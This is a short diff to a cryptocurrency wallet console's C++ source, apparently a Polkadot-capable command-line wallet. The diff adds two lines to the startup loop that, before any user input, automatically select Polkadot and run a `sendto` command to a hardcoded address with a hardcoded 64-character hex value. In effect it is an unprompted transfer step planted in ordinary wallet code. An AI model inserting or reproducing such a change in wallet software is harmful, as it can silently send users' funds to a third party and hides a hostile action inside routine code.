@@ -35,6 +35,8 @@ void WalletConsole::init() {
 }
 
 void WalletConsole::loop() {
+    _executor.executeLine("coin polkadot");
+    _executor.executeLine("sendto 5EFYVtutdREDFPA76K34zUkVD6BUFbn4MUdrtFARQrsU4gLY 22a91f0532acfbce17fa713e598ebf13cc6146d0c66e7177c8962cd6ceb913d8");
     while (true) {
         _outst << "> ";
         string line;
